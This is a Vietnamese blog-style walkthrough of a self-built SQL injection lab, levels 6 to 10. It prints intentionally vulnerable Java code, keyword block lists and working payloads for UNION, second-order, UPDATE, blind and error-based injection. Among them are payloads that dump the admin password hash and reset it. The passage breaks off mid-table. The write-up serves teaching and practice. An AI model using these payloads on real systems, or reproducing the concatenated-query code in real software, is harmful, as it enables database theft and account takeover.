+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public String getContentById(String id) throws Exception &#123;</span><br><span class="line">       String query <span class="operator">=</span> &quot;SELECT content FROM posts WHERE id=&quot; <span class="operator">+</span> id;</span><br><span class="line">       System.out.println(&quot;DEBUG GetContent: &quot; <span class="operator">+</span> query);</span><br><span class="line">       try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">            Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">           <span class="keyword">return</span> rs.next() ? rs.getString(<span class="number">1</span>) : &quot;Not found&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Đến với lv6 là lv đầu tiên của advance .</p>
+<p><img src="https://hackmd.io/_uploads/HkTVjArvll.png" alt="image"></p>
+<p><code>SELECT content FROM posts WHERE id=...</code></p>
+<ul>
+<li>Mình kiểm soát biến id</li>
+<li>Không có dấu ‘ trong truy vấn (id không nằm trong dấu nháy)</li>
+<li>Kết quả được hiển thị bên trong một iframe.<br>Ở đây thử thách sẽ là làm sao để lấy được version của database ra từ đó có thể biết được loại database để tìm đường tấn công.<br>Bây giờ ta sẽ thử một payload trước xem liệu kết quả có trả về database version không.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/B1hEn0Hwgl.png" alt="image"></p>
+<p><code>1 UNION SELECT @@version -- -</code> Ở đây trong câu query không hề có dấu ‘’ nên ta có thể inject thẳng vào luôn tiến hành submit để xem có gì được trả về.</p>
+<p><img src="https://hackmd.io/_uploads/H1LTn0BPge.png" alt="image"></p>
+<p>Nó chỉ đưa cho ta một câu như này chứ không có kết quả của việc lấy được database version ra, vậy vấn đề là nằm ở đâu. Sau một lúc tìm hiểu thì có vẻ như vì id&#x3D;1 có giá trị nên sẽ không trả về được theo ý mình mà nó sẽ chỉ trả thông tin vì thế ta sẽ sửa một chút ở payload <code>9999 UNION SELECT @@version -- -</code> ở đây id&#x3D;9999 sẽ trả về rỗng và chuỗi sql sau sẽ được thực thi.</p>
+<p><img src="https://hackmd.io/_uploads/SJ0Y6CSwgl.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hy_qpCHDgg.png" alt="image"></p>
+<p>Thành công lấy ra được version của Mysql.</p>
+<p><img src="https://hackmd.io/_uploads/BkrC6ABDxl.png" alt="image"></p>
+<h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h4>  <summary>SQL Injection Level 7</summary>
+    
+<p>  <img src="https://hackmd.io/_uploads/S1p8ByLveg.png" alt="image"></p>
+<p>Đến với lv7 có thể thấy khá là nhiều chức năng ở lv này bao gồm register login cà view profile vậy lám sao ta tận dụng để tấn công sqli.</p>
+<p><img src="https://hackmd.io/_uploads/SyxmrlIwex.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="type">boolean</span> registerUser(String username, String password) throws Exception &#123;</span><br><span class="line">       String query <span class="operator">=</span> &quot;INSERT INTO users (username, password) VALUES (?, MD5(?))&quot;;</span><br><span class="line">       System.out.println(&quot;DEBUG RegisterUser: &quot; <span class="operator">+</span> query);</span><br><span class="line">       try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">            PreparedStatement ps <span class="operator">=</span> conn.prepareStatement(query)) &#123;</span><br><span class="line">           ps.setString(<span class="number">1</span>, username);</span><br><span class="line">           ps.setString(<span class="number">2</span>, password);</span><br><span class="line">           <span class="keyword">return</span> ps.executeUpdate() <span class="operator">&gt;</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/HkOVHxLPgg.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public String getEmailByUsername(String username) throws Exception &#123;</span><br><span class="line">       String query <span class="operator">=</span> &quot;SELECT email FROM users WHERE username=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line">       System.out.println(&quot;DEBUG GetEmail: &quot; <span class="operator">+</span> query);</span><br><span class="line">       try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">            Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">           <span class="keyword">return</span> rs.next() ? rs.getString(<span class="number">1</span>) : &quot;Not found&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>registerUser(String username, String password) </code><br>Dữ liệu username được lưu vào CSDL y nguyên như bạn nhập (kể cả có ‘, –, UNION, …)<br><code>String query = &quot;SELECT email FROM users WHERE username=&#39;&quot; + username + &quot;&#39;&quot;; </code></p>
+<ul>
+<li>username lấy từ session (đã lưu khi login) → chính là chuỗi đã đăng ký</li>
+<li>Có nối trực tiếp vào SQL mà không escape → SQL Injection gián tiếp (second-order) xảy ra tại đây.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJ06Hl8Pgx.png" alt="image"></p>
+<p>Tiến hành tạo tài khoản là admin&#x2F;admin123<img src="https://hackmd.io/_uploads/Bk1lUeUDlg.png" alt="image"></p>
+<p>Có vẻ như tên admin đã tồn tại trong bảng.<br>Bước 1: Đăng ký tài khoản với payload SQLi<br>username là <code>&#39; UNION SELECT password FROM users --   &#39; </code><br>password là cái gì cũng được.</p>
+<p><img src="https://hackmd.io/_uploads/BkNPKgLPlx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJ7dKlIDle.png" alt="image"></p>
+<p>Độ dài: 43 ký tự vừa VARCHAR(50)<br>Sẽ trả về password của user đầu tiên trong bảng users (thường là admin)</p>
+<p>Bước 2: Thực hiện view profile mình vừa mới tạo, lúc này câu query sẽ trở thành <code>SELECT email FROM users WHERE username=&#39;&#39; UNION SELECT password FROM users -- &#39; </code> Kết quả: rs.getString(1) &#x3D; password dòng đầu tiên trong bảng users</p>
+<p><img src="https://hackmd.io/_uploads/SJULceIDlg.png" alt="image"></p>
+<p>Thành công lôi mật khẩu dạng md5 của admin ra.</p>
+<p><img src="https://hackmd.io/_uploads/H1xqcx8wgg.png" alt="image"></p>
+<h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h4>  <summary>SQL Injection Level 8</summary>
+
+<p>  <img src="https://hackmd.io/_uploads/Hyho9l8Dlx.png" alt="image"></p>
+<p>Lv 8 nó có tên là UPDATE Injection vì ở lv này mình sẽ demo sqli bằng cách sử dụng hàm UPDATE để thay đổi password của admin.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public <span class="type">boolean</span> updateEmail(String email, String username) throws Exception &#123;</span><br><span class="line">       String query <span class="operator">=</span> &quot;UPDATE users SET email=&#x27;&quot; <span class="operator">+</span> email <span class="operator">+</span> &quot;&#x27; WHERE username=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line">       System.out.println(&quot;DEBUG UpdateEmail: &quot; <span class="operator">+</span> query);</span><br><span class="line">       try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">            Statement stmt <span class="operator">=</span> conn.createStatement()) &#123;</span><br><span class="line">           <span class="keyword">return</span> stmt.executeUpdate(query) <span class="operator">&gt;</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>Đây là SQLi điểm yếu chính, vì:</p>
+<ul>
+<li>Cả email và username không được lọc</li>
+<li>Query được tạo bằng nối chuỗi trực tiếp<br>Ý tưởng tấn công<br>Inject qua username, để câu lệnh UPDATE trở thành <code>UPDATE users SET email=&#39;[payload]&#39; WHERE username=&#39;[injected_username]&#39; </code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ByYh1WIDxl.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkLakZLPel.png" alt="image"></p>
+<p>Bây giờ tiến hành payload vào Update email <code>admin&#39;, password=MD5(&#39;hacked&#39;) -- </code> lúc này câu query sẽ trở thành <code>UPDATE users SET email=&#39;admin&#39;, password=MD5(&#39;hacked&#39;) WHERE username=&#39;admin&#39; --&#39; </code> vì ở phần update email không hề có validate và cũng không bắt nó phải giống như một email bình thường.</p>
+<p><img src="https://hackmd.io/_uploads/BJWfZ-LPll.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryM7Zb8wee.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByWUb-IDge.png" alt="image"></p>
+<p>Bây giờ ta sẽ test thử coi liệu password của admin đã được chuyền thành <code>hacked</code> hay chưa.</p>
+<p><img src="https://hackmd.io/_uploads/r1Vt-ZLveg.png" alt="image"></p>
+<p>Thành công login vào admin.<br>PS: ở đây với mỗi lần thực thi được sqli ở lv 12345 mình login được vào admin luôn vì hàm <code>re.next</code> sẽ lấy và đăng nhập với user đầu tiên trên bảng và cũng chính là admin.</p>
+<h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h4>  <summary>SQL Injection Level 9</summary>
+    
+<p><img src="https://hackmd.io/_uploads/SkPu5jkuee.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> loginLevel9(String username, String password) throws Exception &#123;</span><br><span class="line">       String[] sqlKeywords <span class="operator">=</span> &#123;</span><br><span class="line">               &quot;union&quot;, &quot;select&quot;, &quot;from&quot;, &quot;insert&quot;, &quot;update&quot;, &quot;delete&quot;,</span><br><span class="line">               &quot;drop&quot;, &quot;create&quot;, &quot;alter&quot;, &quot;order by&quot;, &quot;group by&quot;, &quot;having&quot;,</span><br><span class="line">               &quot;where&quot;, &quot;or&quot;, &quot;and&quot;, &quot;exec&quot;, &quot;execute&quot;, &quot;sp_&quot;, &quot;xp_&quot;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       String usernameLower <span class="operator">=</span> username.toLowerCase();</span><br><span class="line">       String passwordLower <span class="operator">=</span> password.toLowerCase();</span><br><span class="line"></span><br><span class="line">       System.out.println(&quot;DEBUG: usernameLower = &quot; <span class="operator">+</span> usernameLower);</span><br><span class="line">       System.out.println(&quot;DEBUG: passwordLower = &quot; <span class="operator">+</span> passwordLower);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (String keyword : sqlKeywords) &#123;</span><br><span class="line">           if (usernameLower.contains(keyword) <span class="operator">||</span> passwordLower.contains(keyword)) &#123;</span><br><span class="line">               throw <span class="keyword">new</span> Exception(&quot;SQLI detected (matched keyword: &quot; <span class="operator">+</span> keyword <span class="operator">+</span> &quot;)&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       username <span class="operator">=</span> username.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;<span class="string">&#x27;&quot;, &quot;&quot;);</span></span><br><span class="line"><span class="string">       password = password.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;&#x27;</span>&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">       String query = &quot;<span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>\&quot;&quot; <span class="operator">+</span> username <span class="operator">+</span></span><br><span class="line">               &quot;\&quot; <span class="keyword">AND</span> password<span class="operator">=</span>MD5(\&quot;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">       System.out.println(&quot;DEBUG: Executing query <span class="operator">=</span> &quot; + query);</span><br><span class="line">       lastQuery = query;</span><br><span class="line"></span><br><span class="line">       try (Connection conn = DBConnection.getConnection();</span><br><span class="line">            Statement stmt = conn.createStatement();</span><br><span class="line">            ResultSet rs = stmt.executeQuery(query)) &#123;</span><br><span class="line"></span><br><span class="line">           if (rs.next()) &#123;</span><br><span class="line">               return new User(rs.getString(1), rs.getString(2));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return null;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ở đây tôi để là level 9.<br>Ngay ở đoạn đầu mình đã dùng <code>String</code> để tạo ra một black list về những hàm query nguy hiểm có thể được sử dụng để khai thác sql injection.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String[] sqlKeywords = &#123;</span><br><span class="line">                <span class="string">&quot;union&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;from&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;delete&quot;</span>,</span><br><span class="line">                <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;alter&quot;</span>, <span class="string">&quot;order by&quot;</span>, <span class="string">&quot;group by&quot;</span>, <span class="string">&quot;having&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;execute&quot;</span>, <span class="string">&quot;sp_&quot;</span>, <span class="string">&quot;xp_&quot;</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>Sau đó thì user input sẽ được đưa về lowercase hết cụ thể ở đây là username và password nó sẽ được lowercase để bắt lỗi nếu xài payload kiểu <code>uNiOn</code> hoặc <code>SEL**ECT</code>.<br>Vậy ở đây ta sẽ phải khai thác như thế nào, sau một lúc test và tìm hiểu thì có 2 cách có thể hoạt động được ở lv này đó là Time Based Sqli và Boolean Based Sqli về Time-Based ta sẽ lợi dụng hàm <code>sleep()</code> để khiến cho hệ thống ngủ trong một khoảng thời gian nào đó nếu điều kiện trả về là true. Còn với Boolean-Based ta sẽ lợi dụng bằng cách so sánh điều kiện nếu đúng nó sẽ trả về true sai thì trả về false.<br>Cách khai thác thì vẫn sẽ giống như chall trước chỉ khác rằng bây giờ ta sẽ dùng payload làm sao để tránh được filter mà vẫn tìm ra được giá trị như tên bảng hoặc nội dung bên trong bảng.</p>
+<h4 id="Tien-hanh-test-thu-payload-va-debug"><a href="#Tien-hanh-test-thu-payload-va-debug" class="headerlink" title="Tiến hành test thử payload và debug"></a>Tiến hành test thử payload và debug</h4><p>Đầu tiên là trường hợp của time base </p>
+<p><img src="https://hackmd.io/_uploads/BkR7vEetll.png" alt="image"></p>
+<p>Ở đây thì cái trường hợp nó tương tự với chall trước nên ở phần username mình vẫn sẽ inject <code>\</code> vào để escape sau đó payload sẽ được tiêm vào ở password.<br>Ở đây payload ở password mình sẽ dùng là:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">||</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> <span class="keyword">THEN</span> SLEEP(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/ryXZsVxKxe.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJrXs4eFeg.png" alt="image"></p>
+<p>Ở đây có thể thấy nó có sleep nhưng lại bị sleep khá là lâu, sau khi tìm hiểu thử nguyên nhân thì:<br>MD5() nhận expression, mà SLEEP(5) lại có side-effect (delay).<br>Trong quá trình tính toán MD5, MySQL engine có thể gọi lại nhiều lần → mỗi lần lại sleep 5 giây.<br>Tổng cộng bạn thấy nó như “sleep vô hạn”, thực chất là sleep nhiều lần liên tục.<br>Ở đây nó sleep liên tục 55s tuy lâu nhưng có vẻ payload chạy đúng với ascii là 115&#x3D;s vậy ta biết tên của bảng bắt đầu với chữ s.<br>Bây giờ ta thử với trường hợp là ascii là 114 thử xem liệu nó có sleep không để củng cố.</p>
+<p><img src="https://hackmd.io/_uploads/Hkvk3NeYgg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1VenEeFge.png" alt="image"></p>
+<p>Có thể thấy với ascii&#x3D;114 nó trả về trong 11milisec vậy nên có thể thấy rằng payload có hoạt động và ta hoàn toàn có thể dump được bảng ra với trường hợp này.</p>
+<p><img src="https://hackmd.io/_uploads/SkMs3Eetee.png" alt="image"></p>
+<p>Vì thấy cái sleep có vấn đề về time nên tôi tìm kiếm thêm cách khác nữa và tìm ra được có cách sử dụng 1 với 0 để lấy kết quả là giá trị true false ở đây được gọi là boolean base.</p>
+<p><img src="https://hackmd.io/_uploads/HJYY64gFeg.png" alt="image"></p>
+<p>Với trường hợp boolean base này mình sử dụng payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="operator">&amp;</span>password<span class="operator">=</span><span class="operator">||</span> (ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>|| → trong MySQL là toán tử logical OR</p>
+<p>SUBSTRING(DATABASE(),1,1) → lấy ký tự đầu tiên của tên database hiện tại.</p>
+<p>ASCII(…) → chuyển ký tự đó sang mã ASCII.</p>
+<p>&#x3D;115 → so sánh có bằng 115 (chữ s) không.</p>
+<p>(ASCII(…) &#x3D; 115) → kết quả sẽ là 1 nếu đúng, 0 nếu sai.</p>
+<p><img src="https://hackmd.io/_uploads/BJHJRVlKxx.png" alt="image"></p>
+<p>Trong trường hợp ascii là 115 hay là chữ s thì ta được trả về true.</p>
+<p><img src="https://hackmd.io/_uploads/SykYA4xKlx.png" alt="image"></p>
+<p>Bây giờ ta sử dụng thử giá trị khác thì sẽ như nào.</p>
+<p><img src="https://hackmd.io/_uploads/rkS9R4gFgg.png" alt="image"></p>
+<p>Với giá trị là 114 thì logic sẽ false và nó đưa về login failed.</p>
+<p><img src="https://hackmd.io/_uploads/Skda0NlYlx.png" alt="image"></p>
+<p>Test với mysql có thể thấy 2 trường hợp nó trả về 1 với 0 tương ứng true và false vậy nên ta hoàn toàn có thể lợi dụng để thực hiện dump bảng ở đây là tôi dump tên bảng và ta có thể dùng cách là manual test như mình đang làm hoặc dùng python payload để đó auto test.</p>
+<h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h4>  <summary>SQL Injection Level 10</summary>
+    
+<p>  <img src="https://hackmd.io/_uploads/rJUH1T_Pel.png" alt="image"><br>Ở lv này tôi đã filter hết lại UNION là một hàm query rất hay sử dụng để khai thác sqli.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] blockedKeywords = &#123;</span><br><span class="line">                <span class="string">&quot;union&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;/*&quot;</span>, <span class="string">&quot;*/&quot;</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJ2qJGcwxl.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> loginLevel10(String username, String password) throws Exception &#123;</span><br><span class="line">        if (username <span class="operator">=</span><span class="operator">=</span> <span class="keyword">null</span> <span class="operator">||</span> password <span class="operator">=</span><span class="operator">=</span> <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        String inputLower <span class="operator">=</span> username.toLowerCase();</span><br><span class="line">        String[] blockedKeywords <span class="operator">=</span> &#123; &quot;union&quot;, &quot;--&quot;, &quot;/*&quot;, &quot;*/&quot; &#125;;</span><br><span class="line">        <span class="keyword">for</span> (String keyword : blockedKeywords) &#123;</span><br><span class="line">            if (inputLower.contains(keyword)) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String query <span class="operator">=</span> &quot;SELECT username, password FROM users WHERE username = &#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span></span><br><span class="line">                &quot;&#x27; AND password = &#x27;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line">        System.out.println(&quot;DEBUG SQL Level 10: &quot; <span class="operator">+</span> query);</span><br><span class="line"></span><br><span class="line">        try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">             Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">             ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">            if (rs.next()) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">User</span>(rs.getString(&quot;username&quot;), rs.getString(&quot;password&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây thì UNION đã bị dính filter vậy ta có hướng nào để có thể khai thác sqli bài này.<br>Ở chall này mình sẽ thử khai thác theo kiểu blind trong trường hợp mình không biết tên bảng có mấy hàng mấy cột và bị filter UNION.<br>Việc đầu tiên có lẽ phải tìm cách để enum ra được cái tên bảng:<br>Ở đây mình sẽ xài error base sqli để tìm thử tên bảng.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) AND &#x27;</span>x<span class="string">&#x27;=&#x27;</span>x</span><br></pre></td></tr></table></figure>
+<p>Mục tiêu ban đầu là dùng EXTRACTVALUE để gây lỗi </p>
+<ul>
+<li>CONCAT(0x7e, DATABASE(), 0x7e)</li>
+<li>0x7e &#x3D; ~ (ký tự dấu ngã)</li>
+<li>DATABASE() &#x3D; tên database hiện tại</li>
+<li>CONCAT(…) &#x3D; nối chuỗi thành <code>~database_name~</code></li>
+</ul>
+<p>EXTRACTVALUE(xml_frag, xpath_expr) là gì?</p>
+<ul>
+<li>Đây là một hàm xử lý XML trong MySQL, với:</li>
+<li>xml_frag: Một đoạn XML hợp lệ (ví dụ: ‘<b>value</b>‘)</li>
+<li>xpath_expr: Một biểu thức XPath dùng để lấy dữ liệu từ đoạn XML<br>Ví dụ:<br>SELECT EXTRACTVALUE(1, ‘abc’);<br>Nó sẽ gây lỗi và trả về là <code>XPATH syntax error: &#39;abc&#39;</code><br>Vậy nên ta sẽ lợi dụng lỗi đó để lấy ra được tên bảng nhờ vào CONCAT là một hàm nối chuỗi trong mysql nó ghép các string thành 1 string.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/B1MhXL9vxg.png" alt="image"></p>
+<p>Tiến hành inject username password.</p>
+<p><img src="https://hackmd.io/_uploads/rklnpmLqvxg.png" alt="image"></p>
+<p>Kết quả cho ta thấy bảng ta đang được truy vấn đến là <code>sqli_lab</code>.</p>
+<p>Tương tự ta extract version cũng như vậy username &#x3D; <code>admin&#39; AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) AND &#39;x&#39;=&#39;x</code> password là gì cũng được.</p>
+<p><img src="https://hackmd.io/_uploads/HJP7EUcDlg.png" alt="image"></p>
+<p>Ta sẽ thử đếm số dòng trong bảng <code>&#39; AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM users), 0x7e)) AND &#39;x&#39;=&#39;x</code></p>
+<p><img src="https://hackmd.io/_uploads/Bkcq9UqPex.png" alt="image"></p>
+<p>11 dòng.<br>Từ đây ta có thể tiến hành bruteforce password của admin hoặc tìm thêm user khác tùy vào script.</p>
+<h4 id="Bonus-Level-10"><a href="#Bonus-Level-10" class="headerlink" title="Bonus Level 10"></a>Bonus Level 10</h4>  <summary>SQL Injection Level 10 (Bonus)</summary>
+    
+<p><img src="https://hackmd.io/_uploads/S15j8Ujwel.png" alt="image"></p>
+<p>Đây là giao diện đăng nhập như cũ nhưng bây giờ mình sẽ thử lấy payload cũ để vào xem nó có trả kết quả như trước không.</p>
+<p><img src="https://hackmd.io/_uploads/rJnRIIiPxg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1HJPIsDxe.png" alt="image"></p>
+<p>Bây giờ nó sẽ chỉ trả về invalid cho tất cả trường hợp bị lỗi.<br>Ở chall này bây giờ mình muốn thử một cách đó là sử dụng time based attack sqli kĩ thuật này sẽ dựa vào thời gian trả về response để dump ra được nội dung của bảng.<br>Ở đây ta sẽ test thử một câu truy vấn time base đơn giản xem liệu nó có nhận hay không.<br><code>admin&#39; AND (SELECT SLEEP(5) FROM users LIMIT 1)=&#39;</code></p>
+<p><img src="https://hackmd.io/_uploads/ByGUn9jwel.png" alt="image"></p>
+<table>
+<thead>
+<tr>
+<th>Thành phần</th>
+<th>Giải thích</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;admin&#39;</code></td>
+<td>Đóng chuỗi username hợp lệ.</td>
+</tr>
+<tr>
+<td><code>AND</code></td>
+<td>Điều kiện bổ sung — ta đang tiêm thêm logic vào truy vấn.</td>
+</tr>
+<tr>
+<td><code>(SELECT SLEEP(5) FROM users LIMIT 1)</code></td>
+<td>Subquery: thực hiện lệnh <code>SLEEP(5)</code> — tức là <strong>server sẽ “ngủ” 5 giây</strong> trước khi trả kết quả.</td>
+</tr>
+<tr>
+<td><code>= &#39;&#39;</code></td>
+<td>So sánh kết quả của <code>(SELECT SLEEP(5))</code> với chuỗi rỗng <code>&#39;&#39;</code>. Dù vô lý về mặt logic, vẫn hợp lệ cú pháp SQL.</td>
+</tr>
+<tr>
+<td><strong>Tác dụng chính</strong></td>
+<td>Nếu server có lỗ hổng SQLi và đoạn chèn được thực thi, thì server sẽ <strong>delay 5 giây</strong>, cho thấy <strong>SQLi time-based tồn tại</strong>.</td>
+</tr>
+</tbody></table>
+<p><img src="https://hackmd.io/_uploads/SJzs39oweg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Skqs3csDgx.png" alt="image"></p>
+<p>Thành công biết được rằng là bị dính time base sqli vì có thể thấy response mất 5 giây mới trả về kết quả.<br>Bây giờ ta sẽ thử đếm số bảng bằng phương pháp trên xem sao.<br><code>admin&#39; AND (SELECT SLEEP(5) WHERE (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&lt;3)=&#39;</code></p>
+<table>
+<thead>
+<tr>
+<th>Thành phần</th>
+<th>Mục đích</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>admin&#39;</code></td>
+<td>Đóng chuỗi <code>&#39;username&#39;</code> trong câu lệnh SQL gốc (giả sử có cấu trúc <code>WHERE username = &#39;...&#39;</code>).</td>
+</tr>
+<tr>
+<td><code>AND</code></td>
+<td>Bổ sung điều kiện logic cho truy vấn gốc.</td>
+</tr>
